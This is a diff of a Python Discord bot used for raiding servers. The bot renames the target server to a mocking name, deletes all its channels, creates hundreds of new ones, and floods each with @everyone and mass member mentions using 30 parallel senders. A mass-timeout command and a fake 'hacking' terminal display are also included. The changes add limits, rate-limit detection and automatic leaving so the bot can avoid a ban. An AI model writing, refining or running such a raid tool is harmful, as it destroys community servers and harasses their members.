@@ -14,9 +14,13 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 
 SERVER_NAME = "トイ神の植民地"
 CHANNEL_NAME = "ここはトイ神の集い|TISNに荒らされました😂"
-BATCH_SIZE = 50              # 増加
-CREATE_INTERVAL = 0.0        # 0に変更
-MAX_PARALLEL_SEND = 30       # 並列送信数
+BATCH_SIZE = 50
+CREATE_INTERVAL = 0.0
+MAX_PARALLEL_SEND = 30
+GUILD_ID = 1537420800766771332
+
+MAX_TOTAL_CHANNELS = 800
+MAX_MESSAGES_PER_CHANNEL = 300
 
 COMBINED_TEXT = (
     "@everyone\n"
@@ -38,9 +42,86 @@ COMBINED_TEXT = (
 )
 
 stop_flag = asyncio.Event()
+rate_limit_hit = asyncio.Event()
 background_tasks = set()
 initiator_id = None
 target_guild = None
+total_channels_created = 0
+active_jobs = 0
+final_leave_lock = asyncio.Lock()
+
+async def notify_initiator_rate_limit():
+    if initiator_id is None:
+        return
+    try:
+        user = await bot.fetch_user(initiator_id)
+        if user:
+            await user.send(
+                "⚠️ **DiscordのAPI制限を受けました**\n"
+                "処理を自動的に停止しました。\n"
+                "**Bot本体に影響はありません。** 時間をおいて再実行してください。"
+            )
+    except Exception as e:
+        print(f"DM通知失敗: {e}")
+
+# ===== ✅ 停止だけ（退出しない版）=====
+async def stop_only(message: str = None):
+    global active_jobs
+    stop_flag.set()
+    await asyncio.gather(*background_tasks, return_exceptions=True)
+    background_tasks.clear()
+    active_jobs = 0
+    stop_flag.clear()
+    rate_limit_hit.clear()
+    if message and target_guild:
+        try:
+            ch = target_guild.system_channel or next((c for c in target_guild.text_channels if c.permissions_for(target_guild.me).send_messages), None)
+            if ch:
+                await ch.send(message)
+        except:
+            pass
+
+async def try_auto_leave(message: str = None):
+    async with final_leave_lock:
+        global active_jobs
+        active_jobs -= 1
+        if active_jobs > 0:
+            return
+        stop_flag.set()
+        await asyncio.gather(*background_tasks, return_exceptions=True)
+        background_tasks.clear()
+        if message and target_guild:
+            try:
+                ch = target_guild.system_channel or next((c for c in target_guild.text_channels if c.permissions_for(target_guild.me).send_messages), None)
+                if ch:
+                    await ch.send(message)
+            except:
+                pass
+        if target_guild:
+            try:
+                await target_guild.leave()
+            except Exception as e:
+                print(f"脱退エラー: {e}")
+
+async def force_leave_all(message: str = None):
+    async with final_leave_lock:
+        global active_jobs
+        stop_flag.set()
+        await asyncio.gather(*background_tasks, return_exceptions=True)
+        background_tasks.clear()
+        active_jobs = 0
+        if message and target_guild:
+            try:
+                ch = target_guild.system_channel or next((c for c in target_guild.text_channels if c.permissions_for(target_guild.me).send_messages), None)
+                if ch:
+                    await ch.send(message)
+            except:
+                pass
+        if target_guild:
+            try:
+                await target_guild.leave()
+            except Exception as e:
+                print(f"脱退エラー: {e}")
 
 class StartButton(ui.View):
     def __init__(self, guild):
@@ -48,33 +129,47 @@ class StartButton(ui.View):
         self.guild = guild
     @ui.button(label="実行", style=discord.ButtonStyle.danger, emoji="💻")
     async def start_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        global initiator_id, target_guild
-        await interaction.response.defer()
-        if not stop_flag.is_set() and background_tasks:
-            await interaction.followup.send("⚠️ 既に実行中です", ephemeral=True)
-            return
+        global initiator_id, target_guild, active_jobs
+        await interaction.response.defer(ephemeral=True)
         initiator_id = interaction.user.id
         target_guild = interaction.guild
+        # ✅ 実行中なら停止だけしてから続行
+        if active_jobs > 0:
+            await stop_only("🔄 全削除コマンドのため、以前の処理を停止しました。")
+        active_jobs += 1
         await interaction.followup.send("🔓 侵入承認…システム起動…", ephemeral=False)
-        await infinite_create_and_spam(self.guild)
+        bot.loop.create_task(
+            infinite_create_and_spam(self.guild, delete_channels=True, auto_leave=True)
+        )
 
 def random_mentions(guild: discord.Guild) -> str:
     members = [m for m in guild.members if not m.bot]
     if not members:
         return "@everyone\n"
-    k = min(50, len(members))   # メンション数増加
+    k = min(50, len(members))
     picked = random.choices(members, k=k)
     return " ".join(m.mention for m in picked) + "\n"
 
-# ✅ 並列送信に変更
 async def spam_channel(channel: discord.TextChannel, guild: discord.Guild):
+    sent_count = 0
     async def send_task():
-        while not stop_flag.is_set():
+        nonlocal sent_count
+        while not stop_flag.is_set() and not rate_limit_hit.is_set() and sent_count < MAX_MESSAGES_PER_CHANNEL:
             text = random_mentions(guild) + COMBINED_TEXT
             try:
                 await channel.send(text)
+                sent_count += 1
+            except discord.HTTPException as e:
+                if e.status in (429, 400, 503):
+                    if not rate_limit_hit.is_set():
+                        rate_limit_hit.set()
+                        print(f"⚠️ API制限検知: {e.status}")
+                        await notify_initiator_rate_limit()
+                        await force_leave_all("⚠️ API制限のため全処理を停止します。")
+                    return
+                await asyncio.sleep(0.5)
             except:
-                pass
+                await asyncio.sleep(0.5)
     tasks = [asyncio.create_task(send_task()) for _ in range(MAX_PARALLEL_SEND)]
     await asyncio.gather(*tasks, return_exceptions=True)
 
@@ -86,8 +181,13 @@ async def delete_all_channels_fast(guild: discord.Guild):
         await asyncio.gather(*tasks, return_exceptions=True)
 
 async def batch_create_and_spam(guild: discord.Guild, start_counter: int):
+    global total_channels_created
     create_tasks = []
-    for i in range(BATCH_SIZE):
+    remaining = MAX_TOTAL_CHANNELS - total_channels_created
+    if remaining <= 0:
+        return start_counter
+    actual_batch = min(BATCH_SIZE, remaining)
+    for i in range(actual_batch):
         cnt = start_counter + i
         create_tasks.append(guild.create_text_channel(f"{CHANNEL_NAME}-{cnt}"))
     try:
@@ -96,14 +196,14 @@ async def batch_create_and_spam(guild: discord.Guild, start_counter: int):
         return start_counter
     for ch in channels:
         if isinstance(ch, discord.TextChannel):
+            total_channels_created += 1
             task = asyncio.create_task(spam_channel(ch, guild))
             background_tasks.add(task)
             task.add_done_callback(background_tasks.discard)
-    return start_counter + BATCH_SIZE
+    return start_counter + actual_batch
 
-async def infinite_create_and_spam(guild: discord.Guild, delete_channels: bool = True):
-    global initiator_id, target_guild
-    stop_flag.clear()
+async def infinite_create_and_spam(guild: discord.Guild, delete_channels: bool = True, auto_leave: bool = False):
+    global total_channels_created
     try:
         await guild.edit(name=SERVER_NAME)
     except:
@@ -111,12 +211,14 @@ async def infinite_create_and_spam(guild: discord.Guild, delete_channels: bool =
     if delete_channels:
         await delete_all_channels_fast(guild)
     counter = 1
-    while not stop_flag.is_set():
+    while not stop_flag.is_set() and not rate_limit_hit.is_set() and total_channels_created < MAX_TOTAL_CHANNELS:
         counter = await batch_create_and_spam(guild, counter)
         try:
             await asyncio.wait_for(stop_flag.wait(), timeout=CREATE_INTERVAL)
         except asyncio.TimeoutError:
             pass
+    if auto_leave and not rate_limit_hit.is_set():
+        await try_auto_leave(f"✅ タスク完了 合計{total_channels_created}チャンネル作成。")
 
 async def type_and_send(channel, text):
     lines = text.split("\n")
@@ -130,80 +232,66 @@ async def type_and_send(channel, text):
             await msg.edit(content=output)
         await asyncio.sleep(0.0001)
 
-async def just_leave_guild(guild, message: str = None):
-    stop_flag.set()
-    await asyncio.gather(*background_tasks, return_exceptions=True)
-    background_tasks.clear()
-    if message and guild:
-        try:
-            ch = guild.system_channel or next((c for c in guild.text_channels), None)
-            if ch:
-                await ch.send(message)
-        except:
-            pass
-    if guild:
-        try:
-            await guild.leave()
-        except Exception as e:
-            print(f"脱退エラー: {e}")
-
 @bot.event
 async def on_member_remove(member):
     global initiator_id, target_guild
     if initiator_id is None or target_guild is None:
         return
     if member.id == initiator_id and member.guild.id == target_guild.id:
-        await just_leave_guild(
-            target_guild,
-            "👋 実行者がサーバーを退出したため、Botを脱退させます。"
-        )
+        await force_leave_all("👋 実行者が退出したため全処理を停止しBotを終了します。")
+
+@bot.event
+async def on_ready():
+    print(f"起動: {bot.user}")
+    guild = discord.Object(id=GUILD_ID)
+    bot.tree.copy_global_to(guild=guild)
+    await bot.tree.sync(guild=guild)
+    print(f"✅ コマンド登録完了！")
 
 @bot.command()
 async def start(ctx):
-    global initiator_id, target_guild
-    if not stop_flag.is_set() and background_tasks:
-        return
+    global initiator_id, target_guild, active_jobs
     initiator_id = ctx.author.id
     target_guild = ctx.guild
-    await infinite_create_and_spam(ctx.guild, delete_channels=True)
-
-@bot.command()
-async def boost(ctx):
-    global initiator_id, target_guild
-    if not stop_flag.is_set() and background_tasks:
-        return
-    initiator_id = ctx.author.id
-    target_guild = ctx.guild
-    await infinite_create_and_spam(ctx.guild, delete_channels=False)
-
-@bot.command()
-async def stop(ctx):
-    global initiator_id, target_guild
-    stop_flag.set()
-    await asyncio.gather(*background_tasks, return_exceptions=True)
-    background_tasks.clear()
-    initiator_id = None
-    target_guild = None
-    await ctx.send("🛑 処理を停止しました。（Botはサーバーに残ります）")
-
-@bot.command(name="bye")
-async def bye(ctx):
-    global initiator_id, target_guild
-    initiator_id = None
-    target_guild = None
-    await just_leave_guild(
-        ctx.guild,
-        "👋 手動終了：サーバーから脱退します。"
+    # ✅ 実行中なら停止だけしてから続行
+    if active_jobs > 0:
+        await stop_only("🔄 以前の処理を停止し、新規タスクを開始します。")
+    active_jobs += 1
+    await ctx.send(f"🚀 !start 実行開始（最大{MAX_TOTAL_CHANNELS}チャンネル / 1チャンネル{MAX_MESSAGES_PER_CHANNEL}件）\n✅ 全処理完了後に自動退出します。")
+    bot.loop.create_task(
+        infinite_create_and_spam(ctx.guild, delete_channels=True, auto_leave=True)
     )
 
 @bot.command()
+async def boost(ctx):
+    global initiator_id, target_guild, active_jobs
+    initiator_id = ctx.author.id
+    target_guild = ctx.guild
+    # ✅ !boostは削除なし → 停止せず並行実行
+    active_jobs += 1
+    await ctx.send(f"🚀 !boost 実行開始（最大{MAX_TOTAL_CHANNELS}チャンネル / 1チャンネル{MAX_MESSAGES_PER_CHANNEL}件）\n✅ 全処理完了後に自動退出します。")
+    bot.loop.create_task(
+        infinite_create_and_spam(ctx.guild, delete_channels=False, auto_leave=True)
+    )
+
+@bot.command()
+async def stop(ctx):
+    """即時全停止＋即時退出"""
+    await ctx.send("🛑 全処理を強制停止し、Botを退出させます。")
+    await force_leave_all("🛑 !stop により全処理停止・Bot退出。")
+
+@bot.command()
 async def hack(ctx):
-    global initiator_id, target_guild
+    global initiator_id, target_guild, active_jobs
     guild = ctx.guild
+    # ✅ 実行中なら停止だけしてから続行
+    if active_jobs > 0:
+        await stop_only("🔄 以前の処理を停止し、新規タスクを開始します。")
     await delete_all_channels_fast(guild)
     ch = await guild.create_text_channel("hacking出力画面")
     initiator_id = ctx.author.id
     target_guild = ctx.guild
+    active_jobs += 1
     hacker_code = "```ansi\n"
     hacker_code += "\x1b[38;5;51m╔══════════════════════════════════════════════════════╗\x1b[0m\n"
     hacker_code += "\x1b[38;5;51m║  TISN SECURITY BREACH ― TERMINAL v4.2.1 ― BUILD 999\x1b[38;5;51m  ║\x1b[0m\n"
@@ -295,10 +383,6 @@ async def total_timeout(ctx):
     success_count = sum(1 for r in results if not isinstance(r, Exception))
     report.append(f"✅ タイムアウト実行: {success_count}/{target_count} 人")
     await ctx.send("## 🎯 !to 完了\n" + "\n".join(report))
-
-@bot.event
-async def on_ready():
-    print(f"起動: {bot.user}")
 
 TOKEN = os.environ.get("DISCORD_BOT_TOKEN")
 if not TOKEN:
